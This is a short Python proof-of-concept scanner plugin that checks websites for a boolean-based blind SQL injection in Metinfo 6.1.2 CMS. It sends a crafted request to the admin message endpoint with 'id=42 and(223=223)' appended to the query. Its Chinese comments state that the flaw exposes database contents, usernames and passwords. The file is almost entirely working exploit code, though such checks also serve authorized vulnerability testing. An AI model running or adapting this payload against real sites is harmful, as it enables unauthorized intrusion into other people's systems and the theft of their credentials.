# Author:w8ay
# Name:Metinfo 6.1.2注入漏洞
# Referer:https://bbs.ichunqiu.com/thread-46687-1-1.html

import HackRequests


def poc(arg, **kwargs):
    payload= arg + "/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42 and(223=223)"
    hh = HackRequests.http(payload)
    if hh.status_code == 200 and "验证码" in hh.text():
        result = {
        "name": "Metinfo 6.1.2注入漏洞",  # 插件名称
        "content": "基于布尔的盲注漏洞可以获得数据库信息以及用户名密码",  # 插件返回内容详情，会造成什么后果。
        "url": payload,  # 漏洞存在url
        "log": hh.log,
        "tag": "sqli"  # 漏洞标签
        }
        return result